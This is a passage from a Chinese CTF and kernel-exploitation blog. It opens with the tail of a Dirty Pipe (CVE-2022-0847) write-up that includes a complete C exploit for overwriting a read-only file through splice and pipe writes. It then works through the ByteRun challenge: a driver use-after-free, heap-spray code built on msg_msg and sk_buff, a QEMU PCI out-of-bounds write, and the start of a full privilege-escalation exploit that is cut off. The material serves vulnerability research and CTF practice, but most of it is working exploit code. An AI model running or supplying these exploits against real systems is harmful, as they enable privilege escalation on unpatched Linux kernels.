*page, size_t offset, size_t bytes,\t\t\t struct iov_iter *i)&#123;\tstruct pipe_inode_info *pipe = i-&gt;pipe;\tstruct pipe_buffer *buf;\tunsigned int p_tail = pipe-&gt;tail;\tunsigned int p_mask = pipe-&gt;ring_size - 1;\tunsigned int i_head = i-&gt;head;\tsize_t off;\tif (unlikely(bytes &gt; i-&gt;count))\t\tbytes = i-&gt;count;\tif (unlikely(!bytes))\t\treturn 0;\tif (!sanity(i))\t\treturn 0;\toff = i-&gt;iov_offset;\tbuf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];\tif (off) &#123;\t\tif (offset == off &amp;&amp; buf-&gt;page == page) &#123;\t\t\t/* merge with the last one */\t\t\tbuf-&gt;len += bytes;\t\t\ti-&gt;iov_offset += bytes;\t\t\tgoto out;\t\t&#125;\t\ti_head++;\t\tbuf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];\t&#125;\tif (pipe_full(i_head, p_tail, pipe-&gt;max_usage))\t\treturn 0;\tbuf-&gt;ops = &amp;page_cache_pipe_buf_ops;\tget_page(page);\tbuf-&gt;page = page;\tbuf-&gt;offset = offset;\tbuf-&gt;len = bytes;\tpipe-&gt;head = i_head + 1;\ti-&gt;iov_offset = offset + bytes;\ti-&gt;head = i_head;out:\ti-&gt;count -= bytes;\treturn bytes;&#125;\n\n可以看到这里在最后是将page直接赋值给了buf，并且未初始化flag。如果我们修改page为目标文件，并且没有修改flag，那么我们可以直接使用pipe_write进行写。\n\n利用思路\n首先生成管道，并使用write填满所有管道 (下面截图中第一个结构体为pipe_inode_info)\n\n\n\n随后read出所有pipe，head和tail相等，清空pipe\n\n\n\n通过splice修改pipe-&gt;bufs-&gt;page指向文件缓存页\n最后通过pipe_write写入内容\n\n综上，得出exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/mman.h&gt;#include &lt;signal.h&gt;#include &lt;sys/prctl.h&gt;#ifndef PAGE_SIZE#define PAGE_SIZE 4096#endifint main()&#123;    int p[2];    int count;    char buffer[4096];    loff_t offset = 1;    char data[] = &quot;196082&quot;;    int data_size = 6;    int fd = open(&quot;/flag&quot;, O_RDONLY);    if (fd &lt; 0)    &#123;        printf(&quot;[-] open failed!\\n&quot;);        exit(-1);    &#125;    if (pipe(p))        abort();    for (int i = 0; i &lt; 16; i++)    &#123;        write(p[1], buffer, sizeof(buffer));    &#125;    for (int i = 0; i &lt; 16; i++)    &#123;        read(p[0], buffer, sizeof(buffer));    &#125;    ssize_t nbytes = splice(fd, &amp;offset, p[1], NULL, 1, 0);    if (nbytes &lt; 0)    &#123;        printf(&quot;[-] splice failed!\\n&quot;);        exit(-1);    &#125;    if (nbytes == 0)    &#123;        printf(&quot;[-] short splice!\\n&quot;);        exit(-1);    &#125;    nbytes = write(p[1], data, data_size);    if (nbytes &lt; 0)    &#123;        printf(&quot;[-] write failed!\\n&quot;);        exit(-1);    &#125;    if (nbytes == 0)    &#123;        printf(&quot;[-] short write!\\n&quot;);        exit(-1);    &#125;    printf(&quot;success!\\n&quot;);    return 0;&#125;\n\n\n\n总的来说，这个CVE的利用不算是很难，后续我会将复现环境都打包到github上\n参考链接:\nhttps://mp.weixin.qq.com/s/6VhWBOzJ7uu80nzFxe5jpg\nhttps://dirtypipe.cm4all.com/\n打包链接:\nhttps://github.com/196082/196082\n","categories":["kernel-pwn","CVE"],"tags":["零拷贝","pipe"]},{"title":"ByteRun复现","url":"/2023/04/01/ByteRun%E5%A4%8D%E7%8E%B0/","content":"当初看到墨晚鸢大佬的博客对这道题目的描述的时候就对这道题暗生情愫了，如今终于是得以复现。\n内核分析函数分析这道题目要说难也算难，要说简单那就是说屁话。这道题可以说是从逆向就开始变得不对劲起来。\nvoid __fastcall bytedev_read(__int64 a1, __int64 user_buf)&#123;  unsigned __int64 v2; // rdx  unsigned __int64 a3; // r14  __int64 v4; // rbx  __int64 v5; // r12  unsigned __int32 v6; // eax  __int64 v7; // r13  __int64 idx; // rax  __int64 offset; // rbp  unsigned __int16 *v10; // r8  __int64 read_size; // rdx  unsigned __int64 remaining_size; // rbx  __int64 read_chunk_pos; // r15  __int64 v14; // rax  __int64 v15; // rcx  __int64 v16; // rbp  __int64 v17; // rdx  unsigned __int32 v18; // eax  unsigned __int32 v19; // eax  __int64 v20; // rbx  _WORD *chunk; // [rsp+10h] [rbp-38h]  _fentry__(a1, user_buf);  a3 = v2;  v4 = *(_QWORD *)(a1 + 0xC8);  v5 = v4 + 40;  raw_spin_lock(v4 + 40);  v6 = __indword(*(_QWORD *)(v4 + 0x20));  if ( !v6 )  &#123;    v7 = *(_QWORD *)(a1 + 0xC8);    idx = *(int *)(v7 + 0xB0);    if ( (_DWORD)idx != *(_DWORD *)(v7 + 0xB4) )    &#123;      offset = 0LL;      if ( a3 )      &#123;        while ( 1 )        &#123;          v10 = *(unsigned __int16 **)(v7 + 8 * idx + 0x30);          read_size = v10[1];          remaining_size = *v10 - (unsigned int)read_size;          read_chunk_pos = (__int64)v10 + read_size + 4;          if ( remaining_size &gt; a3 )            remaining_size = a3;                // current_read_size          if ( (remaining_size &amp; 0x80000000) != 0LL )            BUG();          chunk = *(_WORD **)(v7 + 8 * idx + 0x30);          _check_object_size((char *)v10 + read_size + 4, remaining_size, 1LL);          if ( copy_to_user(offset + user_buf, read_chunk_pos, remaining_size) )            break;          a3 -= remaining_size;          offset += remaining_size;          v14 = (unsigned __int16)(remaining_size + chunk[1]);          chunk[1] += remaining_size;          if ( (_WORD)v14 == *chunk )          &#123;            if ( (_WORD)v14 != 0xFFC )              goto LABEL_21;            kfree(chunk);            *(_DWORD *)(v7 + 0xB0) = (*(_DWORD *)(v7 + 0xB0) + 1) % 0x10;          &#125;          if ( a3 )          &#123;            idx = *(int *)(v7 + 0xB0);            if ( (_DWORD)idx != *(_DWORD *)(v7 + 0xB4) )              continue;          &#125;          goto LABEL_21;        &#125;        printk(&amp;unk_F90);      &#125;    &#125;    goto LABEL_21;  &#125;  if ( v6 != 1 )  &#123;    printk(&amp;unk_1038);LABEL_21:    raw_spin_unlock(v5);    return;  &#125;  v15 = *(_QWORD *)(a1 + 0xC8);  v16 = 0x200LL;  if ( a3 &lt;= 0x200 )    v16 = a3;  v17 = *(_QWORD *)(v15 + 0x20);  v18 = __indword(v17);  if ( v18 == 1 )  &#123;    v19 = __indword(v17 + 2);    if ( v19 == 2 )    &#123;      v20 = *(_QWORD *)(v15 + 0x18);      _check_object_size(v20, v16, 1LL);      if ( copy_to_user(user_buf, v20, v16) )        printk(&amp;unk_1010);    &#125;    else    &#123;      printk(&amp;unk_FF0);    &#125;    goto LABEL_21;  &#125;  bytedev_read_cold_14();&#125;\n\n可以看到在驱动的这个read函数中被分为了两块，在下半部分可以看到一直使用的是__indword函数，而这个是对于设备的IO操作，所以下半部分就是对于设备的控制，上半部分则是对于内核中自身的操作。\n__int64 __fastcall bytedev_write(__int64 a1, __int64 a2)&#123;  unsigned __int64 v2; // rdx  unsigned __int64 a3; // rbp  __int64 v4; // rbx  unsigned __int32 v5; // eax  __int64 v6; // r14  int idx; // r9d  int read_idx; // esi  int v9; // eax  __int64 v10; // r15  int v11; // edx  __int64 v12; // rax  unsigned __int64 remaining_size; // rbx  __int64 v14; // rax  _WORD *chunk; // r13  __int64 user_buf; // r12  __int64 write_offset; // rax  __int64 v18; // r13  _DWORD *v19; // rbx  __int64 v20; // rcx  __int64 v21; // rsi  __int64 v22; // rdx  unsigned __int32 v23; // eax  unsigned __int32 v24; // eax  __int64 v25; // rbx  _WORD *v27; // rax  _WORD *v28; // rdx  __int64 v30; // [rsp+8h] [rbp-40h]  int v31; // [rsp+8h] [rbp-40h]  __int64 v32; // [rsp+10h] [rbp-38h]  ((void (*)(void))_fentry__)();  a3 = v2;  v4 = *(_QWORD *)(a1 + 0xC8);  v32 = v4 + 0x28;  raw_spin_lock(v4 + 0x28);  v5 = __indword(*(_QWORD *)(v4 + 0x20));  if ( v5 )  &#123;    if ( v5 == 1 )    &#123;      v20 = 0x200LL;      v21 = *(_QWORD *)(a1 + 0xC8);      if ( a3 &lt;= 0x200 )        v20 = a3;      v22 = *(_QWORD *)(v21 + 0x20);      v10 = v20;      v23 = __indword(v22);      if ( v23 == 1 )      &#123;        v24 = __indword(v22 + 2);        if ( v24 == 2 )        &#123;          v25 = *(_QWORD *)(v21 + 0x18);          _check_object_size(v25, v20, 0LL);          if ( copy_from_user(v25, a2, v10) )          &#123;            v10 = -14LL;            printk(&amp;unk_1090);          &#125;        &#125;        else        &#123;          v10 = -14LL;          printk(&amp;unk_FF0);        &#125;      &#125;      else      &#123;        v10 = -14LL;        printk(&amp;unk_FC0);      &#125;    &#125;    else    &#123;      v10 = -14LL;      printk(&amp;unk_1038);    &#125;  &#125;  else  &#123;    v6 = *(_QWORD *)(a1 + 0xC8);    idx = *(_DWORD *)(v6 + 0xB4);    read_idx = *(_DWORD *)(v6 + 0xB0);    v9 = idx + 1;    if ( (idx + 1) % 16 != read_idx      || (v28 = *(_WORD **)(v6 + 8LL * idx + 0x30)) == 0LL      || (v10 = -14LL, *v28 &lt;= 0xFFBu) )    &#123;      v10 = 0LL;      if ( a3 )      &#123;        while ( 1 )        &#123;          if ( v9 % 16 == read_idx )          &#123;            v27 = *(_WORD **)(v6 + 8LL * idx + 0x30);            if ( v27 )            &#123;              if ( *v27 &gt; 0xFFBu )                break;            &#125;          &#125;          chunk = *(_WORD **)(v6 + 8LL * ((idx + 0xF) % 16) + 0x30);          user_buf = a2 + v10;          if ( chunk &amp;&amp; (write_offset = (unsigned __int16)*chunk, (_WORD)write_offset != 0xFFC) )          &#123;            v11 = (unsigned __int16)write_offset;            v12 = (__int64)chunk + write_offset + 4;            remaining_size = (unsigned int)(0xFFC - v11);            if ( remaining_size &gt; a3 )              remaining_size = a3;            if ( (remaining_size &amp; 0x80000000) != 0LL )              BUG();            v30 = v12;            _check_object_size(v12, remaining_size, 0LL);            v14 = copy_from_user(v30, user_buf, remaining_size);            if ( v14 )            &#123;              v10 = v14;              printk(&amp;unk_1060);              break;            &#125;            *chunk += remaining_size;            a3 -= remaining_size;            v10 += remaining_size;          &#125;          else          &#123;            v31 = idx;            v18 = 0xFFCLL;            v19 = (_DWORD *)kmem_cache_alloc_trace(kmalloc_caches[26], 0x400CC0LL, 0x1000LL);            *(_QWORD *)(v6 + 8LL * v31 + 0x30) = v19;            if ( a3 &lt;= 0xFFC )              v18 = a3;            *(_DWORD *)(v6 + 0xB4) = (*(_DWORD *)(v6 + 0xB4) + 1) % 16;            *v19 = 0;            _check_object_size(v19 + 1, v18, 0LL);            if ( copy_from_user(v19 + 1, user_buf, v18) )              return ((__int64 (*)(void))bytedev_write_cold_15)();            a3 -= v18;            *(_WORD *)v19 += v18;            v10 += v18;          &#125;          if ( !a3 )            break;          idx = *(_DWORD *)(v6 + 0xB4);          read_idx = *(_DWORD *)(v6 + 0xB0);          v9 = idx + 1;        &#125;      &#125;    &#125;  &#125;  raw_spin_unlock(v32);  return v10;&#125;\n\n这里write的做法跟read类似，依旧可以分为两个部分。通过我上面修改的变量名称其实也就可以很好的推断出来实际的结构了\nptr &#123;\t0xC8 : manager_object&#125;manager_object &#123;\t(0x30 + idx * 0x8) : each_data\t0xB0 : read_idx\t0xB4 : write_idx&#125;each_data &#123;\t0x0 : write_size\t0x2 : read_size\t0x4 — 0xfff : content&#125;\n\n也就是类似于上述这样的结构。这里的漏洞主要发生于read中，可以看到在已经读取的size为0xffc时则会free掉响应的object但是，实际的指针并没有被清除，这样也就造成了UAF。\nchunk = *(_WORD **)(v6 + 8LL * ((idx + 0xF) % 16) + 0x30);......if ( chunk &amp;&amp; (write_offset = (unsigned __int16)*chunk, (_WORD)write_offset != 0xFFC) )&#123;  ......&#125;else&#123;\t......  *(_DWORD *)(v6 + 0xB4) = (*(_DWORD *)(v6 + 0xB4) + 1) % 16;\t......&#125;\n\n并且在write函数中虽然在第一次写入的时候会修改write_idx为1但是在第二次调用的时候会加上0xf随即和16取余，而这也就等价于对write_idx减一的操作，也就以为着我们仍然可以对刚创建的object进行使用。不过前提是还需要绕过这个if语句，当然绕过的方式也是十分简单，这里使用sk_buff进行堆喷即可并且如果write_size我们修改为比0xffc大的数字还可造成堆溢出。\n利用分析这里的利用方式依旧采用CVE-2021-22555进行利用，不熟悉的朋友可以去查看我先前对这一利用方法的分析。\n因为利用方法以往已经分析过了所以这里只对如何达到上述利用的条件做分析。\n这里又一次不得不提到一个常用的结构体msg_msg了。\nstruct msg_msg&#123;    struct list_head m_list;    long m_type;    size_t m_ts;    /* message text size */    void *next;     /* struct msg_msgseg *next; */    void *security; /* NULL without SELinux */    /* the actual message follows immediately */&#125;;struct list_head&#123;    struct list_head *next, *prev;&#125;;\n\n然后就是我们熟悉的关于msg_msg和msg_queue之间的结构为一个双向链表结构，并且结合linux源码可以看到寻找消息的过程\nstatic struct msg_msg *find_msg(struct msg_queue *msq, long *msgtyp, int mode)&#123;\tstruct msg_msg *msg, *found = NULL;\tlong count = 0;\tlist_for_each_entry(msg, &amp;msq-&gt;q_messages, m_list) &#123;\t\tif (testmsg(msg, *msgtyp, mode) &amp;&amp;\t\t    !security_msg_queue_msgrcv(&amp;msq-&gt;q_perm, msg, current,\t\t\t\t\t       *msgtyp, mode)) &#123;\t\t\tif (mode == SEARCH_LESSEQUAL &amp;&amp; msg-&gt;m_type != 1) &#123;\t\t\t\t*msgtyp = msg-&gt;m_type - 1;\t\t\t\tfound = msg;\t\t\t&#125; else if (mode == SEARCH_NUMBER) &#123;\t\t\t\tif (*msgtyp == count)\t\t\t\t\treturn msg;\t\t\t&#125; else\t\t\t\treturn msg;\t\t\tcount++;\t\t&#125;\t&#125;\treturn found ?: ERR_PTR(-EAGAIN);&#125;\n\n#define list_for_each_entry(pos, head, member)\t\t\t\t\\\tfor (pos = list_first_entry(head, typeof(*pos), member);\t\\\t     !list_entry_is_head(pos, head, member);\t\t\t\\\t     pos = list_next_entry(pos, member))#define list_first_entry(ptr, type, member) \\\tlist_entry((ptr)-&gt;next, type, member)\n\n可以发现使用next指针进行寻找的，那么根据在vuln driver中存在的漏洞就是堆溢出，所以理所当然的就能够想到通过堆溢出修改紧邻的primary msg_msg结构体的next指针指向随机一个seconday msg_msg即可造成两个指针指向通过一个object的情况。那么如果我们这时通过原本指向的secondary msg_msg的primary msg_msg的msg_queue进行索引去msgrcv的话即可释放掉secondary msg_msg，但是还存在一个被堆溢出修改的primary msg_msg的next指针依旧指向secondary msg_msg那么我们仍然可以通过被破坏的primary msg_msg去索引到已经被free掉的secondary msg_msg。这也就造成了我们所期盼的UAF了。\nfor (int i = 0; i &lt; MSG_QUEUE_NUM; i++)&#123;  *(int *)&amp;primary_msg.mtext[0] = MSG_TAG;  *(int *)&amp;primary_msg.mtext[4] = i;  if (msgsnd(msqid[i], &amp;primary_msg,             sizeof(primary_msg) - 8, 0) &lt; 0)  &#123;    errExit(&quot;failed to send primary msg!&quot;);  &#125;  *(int *)&amp;secondary_msg.mtext[0] = MSG_TAG;  *(int *)&amp;secondary_msg.mtext[4] = i;  if (msgsnd(msqid[i], &amp;secondary_msg,             sizeof(secondary_msg) - 8, 0) &lt; 0)  &#123;    errExit(&quot;failed to send secondary msg!&quot;);  &#125;&#125;for (int i = 0; i &lt; MSG_QUEUE_NUM; i += 1024)&#123;  if (msgrcv(msqid[i], &amp;primary_msg, sizeof(primary_msg) - 8, PRIMARY_MSG_TYPE, 0) &lt; 0)  &#123;    errExit(&quot;failed to receive primary msg!&quot;);  &#125;&#125;memset(buf, 0x84, 0x1000);write(fd, buf, 0xffc);read(fd, buf, 0xffc);memset(buf, 0, 0x1000);*(unsigned short *)buf = 0xffd;for (int i = 0; i &lt; SOCKET_NUM; i++)&#123;  for (int j = 0; j &lt; SK_BUFF_NUM; j++)  &#123;    if (write(sk_sockets[i][0], buf, 0x1000 - 0x140) &lt; 0)    &#123;      errExit(&quot;failed to spray sk_buff!&quot;);    &#125;  &#125;&#125;memset(buf, 0xa0, 0x1000);write(fd, buf, 1);\n\n上述代码就是产生漏洞利用条件的攻击代码片段。\nQEMU分析struct pci_driver &#123;        struct list_head node;        const char *name;        const struct pci_device_id *id_table;         int  (*probe)  (struct pci_dev *dev, const struct pci_device_id *id);   /* New device inserted */        void (*remove) (struct pci_dev *dev);   /* Device removed (NULL if not a hot-plug capable driver) */        int  (*suspend) (struct pci_dev *dev, pm_message_t state);      /* Device suspended */        int  (*suspend_late) (struct pci_dev *dev, pm_message_t state);        int  (*resume_early) (struct pci_dev *dev);        int  (*resume) (struct pci_dev *dev);                   /* Device woken up */        void (*shutdown) (struct pci_dev *dev);        int (*sriov_configure) (struct pci_dev *dev, int num_vfs); /* PF pdev */        const struct pci_error_handlers *err_handler;        struct device_driver    driver;        struct pci_dynids dynids;&#125;;\n\n首先使用_pci_register_driver函数注册一个设备驱动，上述就是对应的结构体\n.data:0000000000001E00 00                            bytedev_driver db    0                  ; DATA XREF: init_module+132↑o.data:0000000000001E00                                                                       ; cleanup_module+2B↑o.data:0000000000001E01 00                            db    0.data:0000000000001E02 00                            db    0.data:0000000000001E03 00                            db    0.data:0000000000001E04 00                            db    0.data:0000000000001E05 00                            db    0.data:0000000000001E06 00                            db    0.data:0000000000001E07 00                            db    0.data:0000000000001E08 00                            db    0.data:0000000000001E09 00                            db    0.data:0000000000001E0A 00                            db    0.data:0000000000001E0B 00                            db    0.data:0000000000001E0C 00                            db    0.data:0000000000001E0D 00                            db    0.data:0000000000001E0E 00                            db    0.data:0000000000001E0F 00                            db    0.data:0000000000001E10 03 0C 00 00 00 00 00 00       dq offset aBytedev                      ; &quot;bytedev&quot;.data:0000000000001E18 00 13 00 00 00 00 00 00       dq offset bytedev_ids.data:0000000000001E20 95 06 00 00 00 00 00 00       dq offset bytedev_pci_probe.data:0000000000001E28 C0 00 00 00 00 00 00 00       dq offset bytedev_pci_remove\n\n在内存中就是这样，在注册函数中会调用bytedev_pci_probe函数\n__int64 __fastcall bytedev_pci_probe(__int64 a1)&#123;  unsigned int v1; // r13d  __int64 v3; // rax  __int64 v4; // rbx  __int64 v5; // rax  __int64 i; // rax  unsigned int v7; // r12d  unsigned __int64 v8; // rax  __int64 v9; // rcx  _DWORD *v10; // rdi  __int64 v12[14]; // [rsp+0h] [rbp-70h] BYREF  _fentry__();  v1 = -12;  v12[8] = __readgsqword(0x28u);  printk(&amp;unk_DC8);  v3 = kmem_cache_alloc_trace(kmalloc_caches[2], 0xDC0LL, 0xB8LL);  if ( v3 )  &#123;    *(_QWORD *)(a1 + 0x148) = v3;    v4 = v3;    v1 = pci_enable_device(a1);    if ( v1 )    &#123;      printk(&amp;unk_DF8);LABEL_31:      kfree(v4);      return v1;    &#125;    if ( (*(_BYTE *)(a1 + 0x3D1) &amp; 2) == 0 )    &#123;      v1 = -19;      printk(&amp;unk_E28);LABEL_30:      pci_disable_device(a1);      goto LABEL_31;    &#125;    if ( (*(_BYTE *)(a1 + 0x411) &amp; 1) == 0 )    &#123;      v1 = -19;      printk(&amp;unk_E70);      goto LABEL_30;    &#125;    v1 = pci_request_regions(a1, &quot;ByteDance-CTFDevice&quot;);    if ( v1 )    &#123;      printk(&amp;unk_EB8);      goto LABEL_30;    &#125;    v5 = pci_ioremap_bar(a1, 0LL);    *(_QWORD *)(v4 + 0x18) = v5;    if ( !v5 )    &#123;      v1 = -12;      printk(&amp;unk_EE0);LABEL_29:      pci_release_regions(a1);      goto LABEL_30;    &#125;    *(_QWORD *)(v4 + 0x20) = *(_QWORD *)(a1 + 0x3F8);    raw_spin_lock(&amp;bytedev_lock_minor_num);    for ( i = 0LL; i != 0x100; ++i )    &#123;      v7 = i;      if ( !bytedev_minor_num[i] )      &#123;        bytedev_minor_num[(int)i] = 1;        goto LABEL_17;      &#125;    &#125;    v7 = -1;LABEL_17:    raw_spin_unlock(&amp;bytedev_lock_minor_num);    if ( v7 == -1 )    &#123;      printk(&amp;unk_F08);LABEL_28:      pci_iounmap(a1, *(_QWORD *)(v4 + 24));      goto LABEL_29;    &#125;    if ( v7 )      snprintf((char *)v12, 0x40uLL, &quot;%s%d&quot;, &quot;bytedev&quot;, v7);    else      v12[0] = 0x76656465747962LL;    v8 = device_create(bytedev_class, 0LL, v7 | (bytedev_major_num &lt;&lt; 20), 0LL, v12);    if ( v8 &gt; 0xFFFFFFFFFFFFF000LL )    &#123;      v1 = v8;      printk(&amp;unk_F30);      bytedev_set_unused_minor_num(v7);      goto LABEL_28;    &#125;    v9 = 32LL;    v10 = (_DWORD *)(v4 + 48);    *(_DWORD *)(v4 + 40) = 0;    while ( v9 )    &#123;      *v10++ = 0;      --v9;    &#125;    *(_QWORD *)(v4 + 8) = a1;    *(_QWORD *)(v4 + 176) = 0LL;    *(_QWORD *)v4 = v8;    *(_DWORD *)(v4 + 16) = v7;    bytedev_arr[v7] = v4;    printk(&amp;unk_F60);  &#125;  return v1;&#125;\n\n函数中使用了pci_request_regions对资源进行了探测和占用，导致如果直接使用用户态程序对PCI设备使用时会失败，这里如果提权成功的话可以通过卸载驱动模块来实现取消对资源的占用从而可以直接在用户态使用PCI设备。不过题目这里的驱动中已经完全包含了对PCI设备的使用。\n__int64 __fastcall bytedev_ioctl(__int64 a1, __int64 a2)&#123;  unsigned int v2; // edx  unsigned int a3; // r13d  __int64 v4; // r12  __int64 v5; // rax  __int64 v6; // rbx  __int64 v7; // rdx  unsigned __int32 v8; // eax  _fentry__(a1, a2);  a3 = v2;  v4 = *(_QWORD *)(a1 + 0xC8);  raw_spin_lock(v4 + 0x28);  if ( (_DWORD)a2 != 0x114514 )  &#123;    if ( (_DWORD)a2 == 0x1919810 )    &#123;      v7 = *(_QWORD *)(v4 + 0x20);      v8 = __indword(v7);      if ( v8 == 1 )      &#123;        __outdword(v7 + 1, a3);        v6 = 0LL;      &#125;      else      &#123;        v6 = -14LL;        printk(&amp;unk_CE8);      &#125;    &#125;    else    &#123;      v6 = -14LL;      printk(&amp;unk_BD1);    &#125;    goto LABEL_8;  &#125;  v5 = *(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 0x7C0);  if ( !*(_DWORD *)(v5 + 4) &amp;&amp; !*(_DWORD *)(v5 + 0x14) )  &#123;    __outdword(*(_QWORD *)(v4 + 0x20), a3);    v6 = 0LL;    printk(&amp;unk_CC0);LABEL_8:    raw_spin_unlock(v4 + 0x28);    return v6;  &#125;  return bytedev_ioctl_cold_12();&#125;\n\n首先这里如果你想要使用PCI设备那么你必须保证一点的是ds_0-&gt;regs.mode = 1，因为所有地方都存在这个验证，所以我们首先就需要使用ioctl中__outdword(*(_QWORD *)(v4 + 0x20), a3);语句。这里最好动调一下查看一下*(_QWORD *)(v4 + 0x20)和(unsigned int)&amp;current_task) + 0x7C0到底是什么，结果会发现这里实际就是供我们修改ds_0-&gt;regs.mode的已经会验证当前是否为root权限。\n函数分析struct BYTEPCIDevState&#123;  PCIDevice_0 parent_obj;  BYTEPCIDevRegs_0 regs;  MemoryRegion_0 mmio;  MemoryRegion_0 pmio;  char *blk_mem[256];&#125;;\n\n还是先给一下结构体\nvoid __cdecl byte_dev_pmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123;  int blk_idx; // ebx  BYTEPCIDevState *ds_0; // [rsp+28h] [rbp-18h]  ds_0 = (BYTEPCIDevState *)object_dynamic_cast_assert(                              (Object_0 *)opaque,                              &quot;byte_dev-pci&quot;,                              &quot;../qemu-7.0.0/hw/misc/bytedev.c&quot;,                              0xA3,                              &quot;byte_dev_pmio_write&quot;);  if ( size == 4 )  &#123;    _mm_mfence();    if ( addr )    &#123;      if ( addr == 1 &amp;&amp; ds_0-&gt;regs.blk_status != 1 &amp;&amp; ds_0-&gt;regs.mode == 1 &amp;&amp; (int)val &lt;= 0xFF )      &#123;        ds_0-&gt;regs.blk_idx = val;        ds_0-&gt;regs.blk_status = 1;        if ( !ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx] )        &#123;          blk_idx = ds_0-&gt;regs.blk_idx;          ds_0-&gt;blk_mem[blk_idx] = (char *)g_malloc(0x200LL);        &#125;        ds_0-&gt;regs.blk_status = 2;      &#125;    &#125;    else if ( val &lt;= 1 )    &#123;      ds_0-&gt;regs.mode = val;    &#125;  &#125;&#125;\n\n首先在qemu中的漏洞就出现在这样一个函数中，在对val的类型为int类型，所以可以为负数因为blk_mem为结构体中的一个成员导致可以向上进行溢出。\nvoid __cdecl byte_dev_mmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123;  BYTEPCIDevState *ds_0; // [rsp+28h] [rbp-8h]  ds_0 = (BYTEPCIDevState *)object_dynamic_cast_assert(                              (Object_0 *)opaque,                              &quot;byte_dev-pci&quot;,                              &quot;../qemu-7.0.0/hw/misc/bytedev.c&quot;,                              107,                              &quot;byte_dev_mmio_write&quot;);  if ( ds_0-&gt;regs.mode == 1 &amp;&amp; ds_0-&gt;regs.blk_status == 2 &amp;&amp; size + addr &lt;= 0x200 )  &#123;    if ( size == 2 )    &#123;      *(_WORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;    &#125;    else if ( size &gt; 2 )    &#123;      if ( size == 4 )      &#123;        *(_DWORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;      &#125;      else if ( size == 8 )      &#123;        *(_QWORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;      &#125;    &#125;    else if ( size == 1 )    &#123;      ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;    &#125;  &#125;&#125;\n\nuint64_t __cdecl byte_dev_mmio_read(void *opaque, hwaddr addr, unsigned int size)&#123;  BYTEPCIDevState *ds_0; // [rsp+28h] [rbp-8h]  ds_0 = (BYTEPCIDevState *)object_dynamic_cast_assert(                              (Object_0 *)opaque,                              &quot;byte_dev-pci&quot;,                              &quot;../qemu-7.0.0/hw/misc/bytedev.c&quot;,                              87,                              &quot;byte_dev_mmio_read&quot;);  if ( ds_0-&gt;regs.mode != 1 )    return -1LL;  if ( ds_0-&gt;regs.blk_status != 2 )    return -1LL;  if ( size + addr &lt;= 0x200 )    return *(_QWORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr];  return -1LL;&#125;\n\n根据mmio这俩函数就可以实现任意地址读写。\n利用分析这里利用方法其实挺简单的，就直接在BYTEPCIDevState结构体上找可以利用的地址计算差值即可。思路就是首先泄漏libc地址再泄漏heap地址即可。最后泄漏ops中的内容，并且伪造ops。在最后劫持ops实现栈迁移到堆地址即可完成利用。\n综上，exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;poll.h&gt;#include &lt;time.h&gt;#define MSG_COPY 040000#define MSG_TAG 0xAAAAAAAA#define PRIMARY_MSG_TYPE 0x41#define SECONDARY_MSG_TYPE 0x42#define MSG_QUEUE_NUM 4096#define PRIMARY_MSG_SIZE 0x1000#define SECONDARY_MSG_SIZE 0x400#define VICTIM_MSG_TYPE 0x1337#define SOCKET_NUM 16#define SK_BUFF_NUM 32#define PIPE_NUM 256size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;struct list_head&#123;    struct list_head *next, *prev;&#125;;struct msg_msgseg&#123;    uint64_t next;&#125;;struct msg_msg&#123;    struct list_head m_list;    long m_type;    size_t m_ts;    /* message text size */    void *next;     /* struct msg_msgseg *next; */    void *security; /* NULL without SELinux */    /* the actual message follows immediately */&#125;;struct pipe_buffer&#123;    uint64_t page;    uint32_t offset, len;    uint64_t ops;    uint32_t flags;    uint32_t padding;    uint64_t private;&#125;;struct pipe_buf_operations&#123;    uint64_t confirm;    uint64_t release;    uint64_t try_steal;    uint64_t get;&#125;;struct&#123;    long mtype;    char mtext[PRIMARY_MSG_SIZE - sizeof(struct msg_msg)];&#125; primary_msg;struct&#123;    long mtype;    char mtext[SECONDARY_MSG_SIZE - sizeof(struct msg_msg)];&#125; secondary_msg;struct&#123;    long mtype;    char mtext[0x1000 - sizeof(struct msg_msg) + 0x1000 - sizeof(struct msg_msgseg)];&#125; oob_msg;void errExit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;void get_shell()&#123;    if (getuid())    &#123;        